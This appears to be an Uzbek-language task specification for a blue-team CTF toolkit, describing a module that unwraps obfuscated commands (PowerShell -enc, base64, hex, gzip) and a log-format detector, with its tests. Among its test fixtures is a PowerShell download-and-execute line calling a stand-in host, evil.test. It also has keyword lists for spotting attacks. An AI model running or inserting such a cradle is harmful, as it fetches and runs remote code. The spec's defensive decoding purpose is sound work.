# SPEC_DECODE — obfuskatsiyani ochish va qo'llab-quvvatlanmaydigan format maslahati

Loyiha: `D:\Claude Projects\CTF\blue-kit-staging`

Ikkita mustaqil, kichik modul. Ikkalasi ham musobaqada vaqt tejaydi.

## Nega

**1.** Toolda hech narsa **deshifr qilmaydi**. `base64` butun `bluekit/` bo'ylab
faqat QRadar payload dekodida uchraydi. SIEM generatorimiz `powershell -enc <b64>`
ni **topadi**, lekin ichida nima borligini hech kim ko'rsatmaydi. 1-kun stsenariysi
phishing → execution, ya'ni bu tanqidiy yo'lda.

**2.** Xom `.evtx` yoki `.pcap` berilsa, `bk logs analyze` tushunarsiz xato beradi.
Musobaqada bu 10-15 daqiqa yeydi. Konvertatsiya buyrug'ini **o'zi aytib bersin**.

## TEGMANG

`bk.py` (CLI ni men ulayman), `bluekit/web/**`, `bluekit/siem/**`,
`bluekit/hunt/**`, `bluekit/ir/**`, `bluekit/resp/**`, `bluekit/kb/**`,
`bluekit/doctor.py`, mavjud `tests/test_*.py`, `bk.spec`.

**`bluekit/logs/` ichidagi mavjud fayllarga ham tegmang** — `parse.py`,
`detect.py`, `qradar.py`, `report.py`, `timeline.py` va yaml fayllar
o'zgarmaydi. Faqat **yangi** fayl qo'shiladi.

**Yangi fayllar:** `bluekit/decode.py`, `bluekit/logs/formats.py`,
`tests/test_decode.py`.

Faqat **stdlib** (`base64`, `binascii`, `urllib.parse`, `html`, `gzip`, `zlib`,
`re`, `codecs`). Tashqi kutubxona yo'q.

---

## 1-qism · `bluekit/decode.py`

### API

```python
def decode(text: str, max_depth: int = 6) -> dict
def decode_file(path: str, max_lines: int = 200) -> list
def extract_encoded(text: str) -> list   # matn ichidagi kodlangan bo'laklarni topadi
```

`decode()` qaytaradi:

```python
{
  'input': "powershell -enc SQBFAFgA...",
  'layers': [
     {'step': 1, 'method': 'powershell_enc',
      'note': "-enc argumentidan base64 ajratildi",
      'output': "SQBFAFgA..."},
     {'step': 2, 'method': 'base64+utf16le',
      'note': "base64 dekodlandi, UTF-16LE matn",
      'output': "IEX (New-Object Net.WebClient).DownloadString('http://...')"},
  ],
  'output': "IEX (New-Object Net.WebClient).DownloadString('http://...')",
  'depth': 2,
  'iocs': [{'type': 'url', 'value': 'http://...'}],   # bluekit.kb.ioc.classify orqali
  'truncated': False,
}
```

Hech qanday qatlam ochilmasa: `layers` bo'sh, `output` == `input`.

### Qo'llab-quvvatlanadigan qatlamlar

Har bir qadamda **eng ishonchli** variant tanlanadi va rekursiv davom etadi
(`max_depth` gacha yoki natija o'zgarmay qolguncha):

| method | Nima aniqlanadi |
|---|---|
| `powershell_enc` | `-enc`, `-e`, `-EncodedCommand`, `-ec` argumentidan keyingi base64 |
| `frombase64string` | `FromBase64String('...')` ichidagi base64 |
| `base64` | toza base64 (uzunligi 4 ga bo'linadi, alifbo mos, dekodlangani bosiladigan matn) |
| `base64+utf16le` | base64 natijasi UTF-16LE (har ikkinchi bayt 0x00) |
| `base64+gzip` | base64 dan keyin gzip/zlib sarlavhasi |
| `hex` | `4142...`, `\x41\x42`, `0x41,0x42` |
| `url` | `%41%42` (kamida 2 ta ketma-ket) |
| `html_entity` | `&#65;`, `&#x41;` |
| `reverse` | teskari yozilgan matn (natijada ma'noli kalit so'z chiqsa) |
| `char_array` | `[char]72+[char]69`, `chr(72).chr(69)` |
| `concat` | `'po'+'wer'+'shell'` |
| `caret` | `w^h^o^a^m^i` (cmd escape) |
| `backtick` | `w\`h\`o\`ami` (PowerShell escape) |

**Muhim:** `reverse` va `concat` kabi taxminiy usullar faqat natijada ma'noli
narsa chiqsa qo'llanilsin. "Ma'noli" mezoni: natijada quyidagilardan biri bor —
`http`, `powershell`, `cmd`, `iex`, `invoke`, `download`, `\\`, `.exe`, `select`,
`/bin/`, `base64`. Aks holda o'sha qatlam **qo'llanilmaydi** (aks holda har qanday
matnni "teskari" deb buzib yuborasiz).

Dekodlangan natija bosiladigan matn bo'lmasa (ko'p `\x00` yoki nazorat belgilari)
— o'sha qatlam rad etilsin.

### Xavfsizlik va chegaralar

- Hech qachon dekodlangan matnni **bajarmang** (`eval`, `exec`, `subprocess` yo'q).
- Kirish 1 MB dan katta bo'lsa kesilsin, `truncated: True`.
- Har bir qadam `try/except` ichida — istisno tashlamasin.
- `max_depth` ga yetilsa to'xtasin (cheksiz sikl bo'lmasin).

### `extract_encoded(text)`

Uzun log qatori ichidan kodlangan bo'laklarni topadi (butun qator base64 emas,
lekin ichida base64 bor). Har biri uchun `{'value': ..., 'offset': ..., 'kind': ...}`.
Bu keyin qatorma-qator log tahlilida ishlatiladi.

### `decode_file(path, max_lines)`

Faylni qatorma-qator o'qiydi, har qatorda `extract_encoded` ishlatadi va faqat
**biror narsa ochilgan** qatorlarni qaytaradi:
`[{'line_no': 12, 'input': ..., 'output': ..., 'layers': [...]}]`.

---

## 2-qism · `bluekit/logs/formats.py`

Faqat **aniqlash va maslahat**, konvertatsiya emas.

```python
def identify(path: str) -> dict
```

```python
{
  'path': '...',
  'format': 'evtx',          # evtx | pcap | pcapng | etl | ewf | memdump | zip | unknown | supported
  'supported': False,
  'hint': "Xom EVTX o'qilmaydi. Avval CSV ga aylantiring:\n"
          "  hayabusa.exe csv-timeline -d <papka> -o hb.csv\n"
          "  keyin: bk logs analyze hb.csv --preset hayabusa",
}
```

Aniqlash **kengaytma va sehrli baytlar** bo'yicha (kengaytma yolg'on bo'lishi
mumkin, shuning uchun ikkalasi ham):

| Format | Sehrli baytlar | Kengaytma |
|---|---|---|
| `evtx` | `ElfFile\x00` | `.evtx` |
| `pcap` | `\xd4\xc3\xb2\xa1` yoki `\xa1\xb2\xc3\xd4` | `.pcap`, `.cap` |
| `pcapng` | `\x0a\x0d\x0d\x0a` | `.pcapng` |
| `etl` | — | `.etl` |
| `ewf` | `EVF\x09` | `.e01` |
| `memdump` | `PAGEDU64`, `PAGEDUMP` | `.dmp`, `.vmem`, `.raw` |
| `zip` | `PK\x03\x04` | `.zip`, `.7z` |

Har biri uchun **aniq buyruq** bilan maslahat (o'zbekcha):

- `evtx` → Hayabusa (`csv-timeline`) yoki EvtxECmd, keyin mos `--preset`
- `pcap`/`pcapng` → `tshark -r x.pcap -T fields -E header=y -E separator=, -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e http.request.full_uri > out.csv`,
  yoki Zeek (`zeek -r x.pcap`) → `--preset zeek`
- `etl` → `netsh trace convert`
- `ewf`/`memdump` → bu kit uchun emas, alohida vosita kerak (Volatility / Autopsy)
- `zip` → avval oching

Fayl o'qilmasa yoki mavjud bo'lmasa — `format: 'unknown'`, `hint` da sabab.
Ma'lum va qo'llab-quvvatlanadigan format bo'lsa (`.csv`, `.json`, `.log`, `.evtx`
EMAS) — `format: 'supported'`, `supported: True`, `hint: None`.

Faylni **butunlay o'qimang** — birinchi 16 baytga qarang.

---

## 3-qism · Testlar (`tests/test_decode.py`)

### decode

1. **PowerShell -enc:** haqiqiy namuna yasang — `"IEX (New-Object Net.WebClient)
   .DownloadString('http://evil.test/a.ps1')"` ni UTF-16LE da base64 qiling va
   `powershell -enc <b64>` qatorini bering. `output` da asl matn chiqsin,
   `layers` uzunligi >= 1, `iocs` da URL bo'lsin.
2. **Oddiy base64:** `base64.b64encode(b"whoami /all")` → dekodlansin.
3. **Ikki qatlamli:** base64(base64(matn)) → `depth` >= 2.
4. **Hex:** `\x77\x68\x6f\x61\x6d\x69` → `whoami`.
5. **URL:** `%77%68%6f%61%6d%69` → `whoami`.
6. **Caret:** `w^h^o^a^m^i` → `whoami`.
7. **base64+gzip:** matnni gzip qilib, base64 qiling → ochilsin.
8. **Oddiy matn buzilmasin:** `"C:\\Windows\\System32\\cmd.exe /c dir"` berilganda
   `layers` **bo'sh** bo'lsin va `output == input`. *(Bu eng muhim test —
   dekoder har narsani "ochib" buzib yubormasligi kerak.)*
9. **Ma'nosiz teskari matn rad etilsin:** tasodifiy harflar qatori berilganda
   `reverse` qatlami qo'llanilmasin.
10. **Istisno tashlamaydi:** bo'sh satr, faqat `=`, 1 MB dan katta matn, ikkilik
    axlat — hammasi istisnosiz natija qaytarsin.
11. **`max_depth` hurmat qilinadi:** 10 qatlamli base64 da `depth <= max_depth`.
12. **`extract_encoded`:** uzun log qatori ichidagi base64 bo'lagi topilsin.

### formats

13. Vaqtinchalik fayl yasang, boshiga `ElfFile\x00` yozing → `format == 'evtx'`,
    `supported False`, `hint` da `hayabusa` yoki `EvtxECmd` bo'lsin.
14. `\xd4\xc3\xb2\xa1` → `pcap`, `hint` da `tshark` yoki `zeek`.
15. Oddiy `.csv` fayl → `supported True`, `hint is None`.
16. Mavjud bo'lmagan fayl → istisno emas, `format 'unknown'`.
17. Kengaytmasi `.evtx`, lekin ichi CSV bo'lgan fayl → sehrli baytlar ustun,
    lekin `hint` da chalkashlik haqida eslatma bo'lsin.

## 4-qism · Qabul

```
python -m unittest discover -s tests -p "test_*.py" -q
python -c "from bluekit.decode import decode; import base64,json; print(json.dumps(decode('powershell -enc ' + base64.b64encode('whoami /all'.encode('utf-16le')).decode()), ensure_ascii=False, indent=2))"
```

Hozir **108 ta test** yashil — hammasi yashil qolsin.

Hisobotda yuqoridagi `python -c` chiqishini va `unittest` ning oxirgi 3 qatorini
**ko'chirib** keltiring.

8-test (oddiy matn buzilmasligi) ayniqsa muhim — uni albatta yozing.
